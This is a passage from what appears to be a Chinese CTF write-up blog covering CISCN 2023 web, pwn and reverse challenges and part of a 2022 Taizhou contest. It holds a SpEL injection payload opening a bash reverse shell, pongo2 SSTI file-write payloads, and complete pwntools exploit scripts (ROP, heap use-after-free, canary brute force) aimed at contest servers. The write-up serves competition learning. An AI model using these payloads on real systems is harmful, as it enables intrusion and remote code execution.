class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;replacement&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/xxxx/xxxx 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>


<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-3.png"></p>
<h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><p>源码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> route<br><br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;github.com/flosch/pongo2/v6&quot;</span><br>	<span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br>	<span class="hljs-string">&quot;github.com/gorilla/sessions&quot;</span><br>	<span class="hljs-string">&quot;html&quot;</span><br>	<span class="hljs-string">&quot;io&quot;</span><br>	<span class="hljs-string">&quot;net/http&quot;</span><br>	<span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> store = sessions.NewCookieStore([]<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">&quot;SESSION_KEY&quot;</span>)))<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>		session.Values[<span class="hljs-string">&quot;name&quot;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>		err = session.Save(c.Request, c.Writer)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br>	&#125;<br><br>	c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;Hello, guest&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>		http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	name := c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;ssti&quot;</span>)<br>	xssWaf := html.EscapeString(name)<br>	tpl, err := pongo2.FromString(<span class="hljs-string">&quot;Hello &quot;</span> + xssWaf + <span class="hljs-string">&quot;!&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-built_in">panic</span>(err)<br>	&#125;<br>	out, err := tpl.Execute(pongo2.Context&#123;<span class="hljs-string">&quot;c&quot;</span>: c&#125;)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	c.String(<span class="hljs-number">200</span>, out)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Flask</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	session, err := store.Get(c.Request, <span class="hljs-string">&quot;session-name&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> session.Values[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			http.Error(c.Writer, <span class="hljs-string">&quot;N0&quot;</span>, http.StatusInternalServerError)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br>	&#125;<br>	resp, err := http.Get(<span class="hljs-string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;guest&quot;</span>))<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		<span class="hljs-keyword">return</span><br>	&#125;<br>	<span class="hljs-keyword">defer</span> resp.Body.Close()<br>	body, _ := io.ReadAll(resp.Body)<br><br>	c.String(<span class="hljs-number">200</span>, <span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure>

<p>有三个路由</p>
<figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">r.GET(<span class="hljs-string">&quot;/&quot;</span>, route.Index)<br>r.GET(<span class="hljs-string">&quot;/admin&quot;</span>, route.Admin)<br>r.GET(<span class="hljs-string">&quot;/flask&quot;</span>, route.Flask)<br></code></pre></td></tr></table></figure>

<p><code>Index</code>路由提供了一个默认的session，name赋值为guest<br><code>Admin</code>路由判断session，需要name值为admin，并使用EscapeString转义name，而且还使用了pongo2渲染，存在ssti漏洞<br><code>Flask</code>路由访问内部5000端口的flask服务并回显页面</p>
<p>因为<code>SESSION_KEY</code>是从环境变量获取的，猜测为空，进行<code>session</code>伪造<br>本地修改<code>session.Values[&quot;name&quot;] = &quot;admin&quot;</code>，运行拿到伪造的<code>session</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-1.png"></p>
<p>访问<code>/flask?name=/</code>通过报错拿到<code>flask</code>源码</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-3.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args[<span class="hljs-string">&#x27;name&#x27;</span>]<br>    <span class="hljs-keyword">return</span> name + <span class="hljs-string">&#x27;no ssti&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__== <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>


<p>可以看到<code>flask</code>开启了<code>debug</code>模式，<code>debug</code>攻击点一般在<code>算pin</code>或<code>debug热加载</code><br>但是访问<code>/console</code>实现rce需要携带cookie验证，因为我们无法传递cookie，所以利用ssti读文件算pin后rce这条路走不通</p>
<p>如图，当flask文件的内容被更改后，flask会自动更新，也就是热加载</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-2.png"></p>
<p>所以我们可以利用ssti实现任意文件读写，然后覆盖server.py，实现自己的恶意内容</p>
<p>查阅<a href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">官方手册</a>可知pongo2与Django 1.7有兼容的语法和功能集</p>
<p>Django中的include语法在pongo2中也能使用，所以可以用include实现任意文件读取<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-6.png"></p>
<p>写文件可以⽤Gin Context里的FormFile来读取表单⽂件，用SaveUploadFile上传，注意需要用GET传参</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-8.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-7.png"></p>
<figure class="highlight golang"><table><tr><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">//读文件</span><br>&#123;%include c.Request.Referer()%&#125;<br>&#123;%include c.Request.Host()%&#125;<br><br><span class="hljs-comment">//写文件</span><br><span class="hljs-comment">//这三个payload其实大同小异，只是后两个使用了过滤器（c.HandlerName的值为 main/route.Admin ）</span><br>&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())&#125;&#125;<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;&#123;c.SaveUploadedFile(c.FormFile(form),c.Request.Referer())&#125;&#125;&amp;m=file<br>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py<br></code></pre></td></tr></table></figure>


<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-4.png"></p>
<p>覆盖后就可以执行我们自定义的内容了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-go_session-5.png"></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h2><p>修改名称存在栈溢出，程序不存在<code>system</code>函数，使用<code>orw</code>获取<code>flag</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./shaokao&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.251.120&quot;</span>,<span class="hljs-string">&quot;12585&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><br>fopen=e.sym[<span class="hljs-string">&#x27;open64&#x27;</span>]<br>read=e.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=e.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401fae&#x27;)</span><br>rdi=<span class="hljs-number">0x000000000040264f</span> <span class="hljs-comment">#rdi</span><br>rsi=<span class="hljs-number">0x000000000040a67e</span> <span class="hljs-comment">#rsi</span><br>rdx=<span class="hljs-number">0x00000000004a404b</span> <span class="hljs-comment">#rdx rbx</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-100000&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(fopen)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(read)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>p.sendline(payload)<br></code></pre></td></tr></table></figure>

<h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>程序使用了<code>protobuf</code>协议解析输入数据，构造<code>protobuf</code>数据，传入即可<br>程序中存在<code>uaf</code>漏洞与数组越界漏洞，利用<code>gadget</code>构造栈迁移，实现<code>orw</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Size</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x22&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27; &#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Size(size)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">4</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    gdb.attach(p)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;123.56.244.196&quot;</span>,<span class="hljs-string">&quot;35492&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0xe8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>heap=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>show(<span class="hljs-number">2</span>)<br>heap1=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap1))<br><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br><br>show(<span class="hljs-number">8</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-<span class="hljs-number">0x1eccc0</span><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x154dea</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>rdi=<span class="hljs-number">0x0000000000023b6a</span>+libc.address<br>rsi=<span class="hljs-number">0x000000000002601f</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000142c92</span>+libc.address<br>leave=libc.address+<span class="hljs-number">0x00000000000578c8</span><br>edit(<span class="hljs-number">6</span>,p64(free_hook))<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xe8</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span><br><br>edit(<span class="hljs-number">0</span>,flat([heap+<span class="hljs-number">0x48</span>,leave,<br>    heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    heap,<span class="hljs-number">0</span>,<br>    leave,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    heap,<br>    rdi,heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    rsi,<span class="hljs-number">0x1000</span>,<br>    rdx,<span class="hljs-number">7</span>,<br>    mprotect,<br>    heap1]))<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)+shellcraft.write(<span class="hljs-number">1</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)<br>edit(<span class="hljs-number">1</span>,asm(shellcode))<br><br>add(<span class="hljs-number">0x11</span>,<span class="hljs-number">0xe8</span>)<br>add(<span class="hljs-number">0x12</span>,<span class="hljs-number">0xe8</span>,p64(gadget))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br><br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><p>程序使用了<code>fork</code>，所以在子进程中报错，不会使程序中断，所以爆破<code>canary</code>，然后跳转到后门位置就可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>backdoor=<span class="hljs-number">0x1229</span><br><br><span class="hljs-comment">#p=process(&quot;./funcanary&quot;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.135.185&quot;</span>,<span class="hljs-string">&quot;32640&quot;</span>)<br><br>canary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>        p.sendafter(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+p8(j))<br>        data=p.readline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;stack&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-built_in">print</span>(j)<br>            canary+=p8(j)<br>            <span class="hljs-keyword">break</span><br>i=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">0x10</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        data=p.readuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        f.write(data)<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p16(<span class="hljs-number">0xffff</span>&amp;(<span class="hljs-number">0x1200</span>+j+i*<span class="hljs-number">0x1000</span>)))<br>        pause()<br>    i+=<span class="hljs-number">1</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="Shell-We-Go"><a href="#Shell-We-Go" class="headerlink" title="Shell We Go"></a>Shell We Go</h2><p>当认证结束之后，执行<code>echo</code>指令，存在栈溢出，使用<code>+</code>可以跳过栈空间，直接覆盖返回值<br>构造<code>rop</code>，执行<code>orw</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;47.93.187.243&quot;</span>,<span class="hljs-string">&quot;38686&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;cert nAcDsMicN  S33UAga1n@#!&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>cmd=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">bp 0x4c181a</span><br><span class="hljs-string">bp 0x4c18a0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makepayload</span>(<span class="hljs-params">data</span>):<br>    e=<span class="hljs-string">b&#x27;&#x27;</span><br>    i=<span class="hljs-number">0</span><br>    step=<span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>        e+=data[i:i+step]+<span class="hljs-string">b&#x27; &#x27;</span><br>        i+=step<br>    <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;echo &#x27;</span>+e<br><br>rdi=<span class="hljs-number">0x0000000000444fec</span><br>system=<span class="hljs-number">0x43e7e6</span><br>rsi=<span class="hljs-number">0x000000000041e818</span><br>rdx=<span class="hljs-number">0x000000000049e11d</span><br>sh=<span class="hljs-number">0x4c38e7</span><br>rax=<span class="hljs-number">0x000000000040d9e6</span><br>flag=<span class="hljs-number">0x4c34c8</span><br>syscall=<span class="hljs-number">0x000000000040328c</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>bss=e.bss()<br><br>payload=<span class="hljs-string">b&#x27;+&#x27;</span>*(<span class="hljs-number">0x298</span>-<span class="hljs-number">0x78</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">3</span>+p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>p.sendline(makepayload(payload))<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p><a href="https://snap.berkeley.edu/">https://snap.berkeley.edu/</a> 导入xml</p>
<p>导出密文后异或得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-reverse-babyre.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(a)):<br>    a[i]=a[i]^a[i-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>2022台州市第二届网络安全大赛wp</title>
    <url>/%E7%AB%9E%E8%B5%9B/2022%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html</url>
    <content><![CDATA[<h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="bitlocker"><a href="#bitlocker" class="headerlink" title="bitlocker"></a>bitlocker</h3><p>内存取证，在内存镜像中搜索<code>txt</code>文件，得到<code>BitLocker</code>恢复密钥</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-misc-1-1.png"></p>
<p>导出后得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><code class="hljs txt">BitLocker 驱动器加密恢复密钥<br><br>恢复密钥用于恢复 BitLocker 保护的驱动器上的数据。<br><br>若要验证该密码是否为正确的恢复密码，请将这些标记与恢复屏幕上显示的标记进行比较。<br><br>恢复密钥标记: 118D5B0A-0C1F-4F<br>完整恢复密钥标记: 118D5B0A-0C1F-4F76-A3B7-01658D566145<br><br>BitLocker 恢复密钥:<br>432696-262691-480018-407649-083578-365651-065142-713999<br></code></pre></td></tr></table></figure>

<p>在windows7虚拟机上挂载<code>bitlocker.vmdk</code>，使用恢复密钥<code>432696-262691-480018-407649-083578-365651-065142-713999</code>解锁，拿到<code>flag</code>文件</p>
<p>文件开头为<code>42 4d</code>，判断是bmp文件，但是文件头被修改了</p>
<p>删掉文件头和文件尾，文件长度除以4后为<code>39949</code>，因式分解得到<code>7*13*439</code>，所以宽高是<code>439*91</code></p>
<p>用python生成一个宽为439，高为91的rgba格式的bmp文件，和原文件比较，还原文件头，得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-misc-1-2.png"></p>
